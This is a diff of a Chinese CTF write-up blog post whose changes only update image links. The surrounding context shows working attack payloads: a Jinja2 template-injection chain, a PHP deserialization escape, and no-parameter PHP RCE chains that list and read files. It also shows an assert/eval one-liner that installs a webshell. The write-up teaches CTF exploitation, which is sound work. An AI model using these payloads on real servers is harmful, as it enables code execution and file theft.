@@ -235,8 +235,8 @@ X-Forwarded-For: {{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.a
 X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}
 </code></pre></td></tr></table>
 </div>
-</div><img class="alignnone size-full wp-image-429" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200509221921.png" alt="" width="1492" height="449" />
-<img class="alignnone size-full wp-image-430" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200509221820.png" alt="" width="1234" height="353" />
+</div><img class="alignnone size-full wp-image-429" src="https://leonsec.gitee.io/images/QQ图片20200509221921.png" alt="" width="1492" height="449" />
+<img class="alignnone size-full wp-image-430" src="https://leonsec.gitee.io/images/QQ图片20200509221820.png" alt="" width="1234" height="353" />
 <p>这里getitem的用法为：<code>__mro__[2]== __mro__.__getitem__(2)</code>这样方便构造</p>
 <p>这里是用的GET传参，将其中的<code>request.args</code>改为<code>request.values</code>则利用POST的方式进行传参</p>
 <p>flag：minil{4326ae13-0106-423d-b9fc-3fc989f84bcf}</p>
@@ -595,8 +595,8 @@ b=AAAA&#34;;s:8:&#34;password&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;O:1:&#34;C
 <p>我们目的要将<code>$fuck['V0n']='no_girlfriend'; </code>变为：<code>$fuck['V0n']='has_girlfriend'; </code></p>
 <p>但是直接传进去是没用的，我们得想办法逃逸这段序列化代码</p>
 <p>看图就很明白了：</p>
-<img class="alignnone size-full wp-image-447" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200512153738.png" alt="" width="1384" height="480" />
-<img class="alignnone size-full wp-image-452" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200512154253.png" alt="" width="1404" height="209" />
+<img class="alignnone size-full wp-image-447" src="https://leonsec.gitee.io/images/QQ图片20200512153738.png" alt="" width="1384" height="480" />
+<img class="alignnone size-full wp-image-452" src="https://leonsec.gitee.io/images/QQ图片20200512154253.png" alt="" width="1404" height="209" />
 <p>我们输入的payload会赋值给<code>$fuck['mini']</code>看上图我们输入：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -611,7 +611,7 @@ b=AAAA&#34;;s:8:&#34;password&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;O:1:&#34;C
 <p>于是本来php占的21个字符扩张为了21+35=56个字符，刚好等于之前传入的所有字符长度</p>
 <p>于是所有hack!!!!变为<code>$fuck['mini']</code>的内容，后面构造的序列化字符串就会逃逸出来，闭合以后被php执行</p>
 <p>得到flag：</p>
-<img class="alignnone size-full wp-image-449" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200512153746.png" alt="" width="1655" height="212" />
+<img class="alignnone size-full wp-image-449" src="https://leonsec.gitee.io/images/QQ图片20200512153746.png" alt="" width="1655" height="212" />
 <p>minil{2aef3ba7-3808-4495-b8f1-6150c0b8c421}</p>
 <h2 id="lets_play_dolls">Let&rsquo;s_Play_Dolls</h2>
 <p>考点：PHP反序列化，无参数RCE</p>
@@ -995,7 +995,7 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 </span></code></pre></td></tr></table>
 </div>
 </div><p>得到：</p>
-<img class="alignnone size-full wp-image-472" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514145036.png" alt="" width="746" height="80" />
+<img class="alignnone size-full wp-image-472" src="https://leonsec.gitee.io/images/QQ图片20200514145036.png" alt="" width="746" height="80" />
 <p>直接访问<code>youCanGet1tmaybe</code>得到flag：</p>
 <p>minil{ba5683ec-9b63-4591-9be1-e8f0247e1529}</p>
 <h2 id="无参数rce">无参数RCE</h2>
@@ -1003,14 +1003,14 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 <p><code>&lt;?php print_r(scandir('.')); ?&gt;</code>可以用来查看当前目录所有文件</p>
 <p>但是要怎么构造参数里这个点呢，这里介绍个函数：</p>
 <p><code>localeconv()</code>返回一包含本地数字及货币格式信息的数组。而数组第一项就是&quot;.&quot;</p>
-<img class="alignnone size-full wp-image-456" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514110216.png" alt="" width="534" height="194" />
+<img class="alignnone size-full wp-image-456" src="https://leonsec.gitee.io/images/QQ图片20200514110216.png" alt="" width="534" height="194" />
 <p>要怎么取到这个点呢，另一个函数：</p>
 <p><code>current()</code>返回数组中的单元，默认取第一个值</p>
-<img class="alignnone size-full wp-image-457" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112512.png" alt="" width="383" height="78" />
-<img class="alignnone size-full wp-image-458" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112653.png" alt="" width="363" height="149" />
+<img class="alignnone size-full wp-image-457" src="https://leonsec.gitee.io/images/QQ图片20200514112512.png" alt="" width="383" height="78" />
+<img class="alignnone size-full wp-image-458" src="https://leonsec.gitee.io/images/QQ图片20200514112653.png" alt="" width="363" height="149" />
 <p>所以<code>scandir(current(localeconv()));</code>成功打印出当前目录下文件：</p>
-<img class="alignnone size-full wp-image-460" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112940.png" alt="" width="490" height="86" />
-<img class="alignnone size-full wp-image-459" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112912.png" alt="" width="469" height="76" />
+<img class="alignnone size-full wp-image-460" src="https://leonsec.gitee.io/images/QQ图片20200514112940.png" alt="" width="490" height="86" />
+<img class="alignnone size-full wp-image-459" src="https://leonsec.gitee.io/images/QQ图片20200514112912.png" alt="" width="469" height="76" />
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1027,7 +1027,7 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 <p><code>chdir()</code>改变工作目录</p>
 <p>如果文件不能直接显示呢？比如php源码</p>
 <p>那我们要怎么取出这个数组呢：</p>
-<img class="alignnone size-full wp-image-461" src="https://gitee.com/leonsec/images/raw/master/1625650-20200215122752930-1717233019.png" alt="" width="1043" height="486" />
+<img class="alignnone size-full wp-image-461" src="https://leonsec.gitee.io/images/1625650-20200215122752930-1717233019.png" alt="" width="1043" height="486" />
 <p>手册里有这些方法，如果要获取的数组是最后一个那我们直接<code>print_r(readfile(end(scandir(getcwd()))));</code></p>
 <p>或者：<code>print_r(readfile(current(array_reverse(scandir(getcwd())))));</code></p>
 <p><code>array_reverse()</code>以相反的元素顺序返回数组</p>
@@ -1036,20 +1036,20 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 <p><code>array_rand(array_flip())</code>array_flip()是交换数组的键和值，array_rand是随机返回一个数组</p>
 <p>我们可以用：<code>print_r(readfile(array_rand(array_flip(scandir(current(localeconv()))))));</code></p>
 <p>或者：<code>print_r(readfile(array_rand(array_flip(scandir(getcwd())))));</code></p>
-<img class="alignnone size-full wp-image-462" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514121755.png" alt="" width="291" height="168" />
+<img class="alignnone size-full wp-image-462" src="https://leonsec.gitee.io/images/QQ图片20200514121755.png" alt="" width="291" height="168" />
 <p>多刷新几次在源码中查看到我们成功读取了目标文件</p>
 <h3 id="如果目标文件不在当前目录呢">如果目标文件不在当前目录呢？</h3>
 <p><code>print_r(scandir(dirname(getcwd())));</code>查看上一级目录的文件</p>
 <p>当然直接<code>print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));</code>是不可以的</p>
 <p>会报错，因为默认是在当前目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前目录</p>
 <p>前面写到了chdir()，用<code>print_r(readfile(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))));</code>即可改变当前目录为上一层目录并读取文件</p>
-<img class="alignnone size-full wp-image-463" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514124715.png" alt="" width="266" height="68" />
+<img class="alignnone size-full wp-image-463" src="https://leonsec.gitee.io/images/QQ图片20200514124715.png" alt="" width="266" height="68" />
 <h5><strong>如果在上一层目录的另一个文件夹里呢</strong></h5>
 我们使用：`print_r(scandir(dirname(getcwd())));`
 <p>可以得到：</p>
-<img class="alignnone size-full wp-image-464" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514125225.png" alt="" width="319" height="287" />
+<img class="alignnone size-full wp-image-464" src="https://leonsec.gitee.io/images/QQ图片20200514125225.png" alt="" width="319" height="287" />
 <p>使用：<code>print_r(array_rand(array_flip(scandir(dirname(getcwd())))));</code>得到：</p>
-<img class="alignnone size-full wp-image-465" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514125654.png" alt="" width="425" height="139" />
+<img class="alignnone size-full wp-image-465" src="https://leonsec.gitee.io/images/QQ图片20200514125654.png" alt="" width="425" height="139" />
 <p>这里我本来想尝试套娃使用类似的方法获取，但是发现好像并不行</p>
 <p>没事我们可以换一种方法，我将index.php源代码修改为：</p>
 <div class="highlight"><div class="chroma">
@@ -1064,18 +1064,18 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 </div>
 </div><p>这里又介绍一个函数：<code>get_defined_vars()</code>此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
 <p>输入：<code>?a=print_r(current(get_defined_vars()));&amp;b=a</code>返回：</p>
-<img class="alignnone size-full wp-image-466" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514141609.png" alt="" width="680" height="152" />
+<img class="alignnone size-full wp-image-466" src="https://leonsec.gitee.io/images/QQ图片20200514141609.png" alt="" width="680" height="152" />
 <p>这下简单了，我们只需要在b处写需要执行的代码，用next()即可获取到b的值</p>
-<img class="alignnone size-full wp-image-467" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514141819.png" alt="" width="777" height="181" />
+<img class="alignnone size-full wp-image-467" src="https://leonsec.gitee.io/images/QQ图片20200514141819.png" alt="" width="777" height="181" />
 <p>输入：<code>?a=assert(next(current(get_defined_vars())));&amp;b=phpinfo();//也可以用eval</code></p>
 <p>返回：</p>
-<img class="alignnone size-full wp-image-468" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514142154.png" alt="" width="1430" height="701" />
+<img class="alignnone size-full wp-image-468" src="https://leonsec.gitee.io/images/QQ图片20200514142154.png" alt="" width="1430" height="701" />
 <p>我们可以直接：<code>?a=assert(next(current(get_defined_vars())));&amp;b=eval($_POST['a']);</code>蚁剑一把梭</p>
 <p>或者由之前查到的路径：<code>?a=assert(next(current(get_defined_vars())));&amp;b=print_r(scandir('../flag_is_here'));</code></p>
-<img class="alignnone size-full wp-image-469" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514143558.png" alt="" width="943" height="198" />
+<img class="alignnone size-full wp-image-469" src="https://leonsec.gitee.io/images/QQ图片20200514143558.png" alt="" width="943" height="198" />
 <p>发现了flag3.php，输入：<code>?a=assert(next(current(get_defined_vars())));&amp;b=readfile('../flag_is_here/flag3.php'); </code></p>
 <p>源码处得到flag：</p>
-<img class="alignnone size-full wp-image-470" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514143857.png" alt="" width="331" height="113" />
+<img class="alignnone size-full wp-image-470" src="https://leonsec.gitee.io/images/QQ图片20200514143857.png" alt="" width="331" height="113" />
 <p>先到这里，还有利用中间件apache的php内置函数<code>apache_request_headers()</code>进行获取headers达到rce</p>
 <p>还有利用php内置函数<code>session_id()</code>获取session进行rce</p>
 <p>挖个坑，持续更新ing&hellip;</p>
